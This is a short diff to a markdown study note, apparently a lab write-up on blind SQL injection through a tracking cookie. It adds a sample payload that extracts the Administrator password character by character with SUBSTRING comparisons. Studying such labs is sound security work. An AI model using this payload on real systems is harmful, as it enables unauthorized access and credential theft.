@@ -22,4 +22,9 @@ A successful query will return "Welcome!", and an unsuccessful one will return n
 > SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklmnopqrstuvwxyz' ' AND '1'='2
 > -- above returns false
 
+> [!Sample payload]
+> ```sql
+> -- SUBSTRING(<string>, )
+> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+
 
